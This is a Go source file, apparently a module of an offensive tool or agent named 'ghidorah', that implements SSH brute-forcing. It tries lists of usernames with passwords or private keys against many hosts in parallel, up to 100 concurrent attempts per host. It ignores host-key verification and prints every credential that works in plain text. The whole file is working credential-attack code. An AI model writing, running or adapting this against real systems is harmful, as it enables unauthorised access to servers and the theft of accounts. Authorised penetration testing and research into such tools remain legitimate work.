package ssh

import (
	"context"
	"fmt"
	"ghidorah/structs"
	"io/ioutil"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/sync/semaphore"
)

// SSHAuthenticator Governs the lock of ssh authentication attempts
type SSHAuthenticator struct {
	host string
	lock *semaphore.Weighted
}

// SSH Functions
func PublicKeyFile(file string) ssh.AuthMethod {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		return nil
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return nil
	}
	return ssh.PublicKeys(key)
}

func SSHLogin(host string, port int, cred structs.Credential, debug bool) {
	var sshConfig *ssh.ClientConfig
	if cred.PrivateKey == "" {
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         500 * time.Millisecond,
			Auth:            []ssh.AuthMethod{ssh.Password(cred.Password)},
		}
	} else {
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			Timeout:         500 * time.Millisecond,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Auth:            []ssh.AuthMethod{PublicKeyFile(cred.PrivateKey)},
		}
	}
	connectionStr := fmt.Sprintf("%s:%d", host, port)
	connection, err := ssh.Dial("tcp", connectionStr, sshConfig)
	if err != nil {
		if debug {
			errStr := fmt.Sprintf("[DEBUG] Failed to dial: %s", err)
			fmt.Println(errStr)
		}
		return
	}
	session, err := connection.NewSession()
	if err != nil {
		return
	}
	session.Close()
	var successStr string
	if cred.PrivateKey == "" {
		successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.Password)
	} else {
		successStr = fmt.Sprintf("[SSH] Hostname: %s\tUsername: %s\tPassword: %s", host, cred.Username, cred.PrivateKey)
	}
	fmt.Println(successStr)
}

func (auth *SSHAuthenticator) Brute(port int, creds []structs.Credential, debug bool) {
	wg := sync.WaitGroup{}

	for i := 0; i < len(creds); i++ {
		auth.lock.Acquire(context.TODO(), 1)
		wg.Add(1)
		go func(port int, cred structs.Credential, debug bool) {
			defer auth.lock.Release(1)
			defer wg.Done()
			SSHLogin(auth.host, port, cred, debug)
		}(port, creds[i], debug)
	}
	wg.Wait()
}

func SSHBruteHost(host string, port int, creds []structs.Credential, debug bool) {
	var lim int64 = 100
	auth := &SSHAuthenticator{
		host: host,
		lock: semaphore.NewWeighted(lim),
	}
	auth.Brute(port, creds, debug)
}

func SSHBruteForce(hosts []string, port int, creds []structs.Credential, debug bool) {
	wg := sync.WaitGroup{}
	for i := 0; i < len(hosts); i++ {
		wg.Add(1)
		go func(host string, port int, creds []structs.Credential, debug bool) {
			defer wg.Done()
			SSHBruteHost(host, port, creds, debug)
		}(hosts[i], port, creds, debug)
	}
	wg.Wait()
}
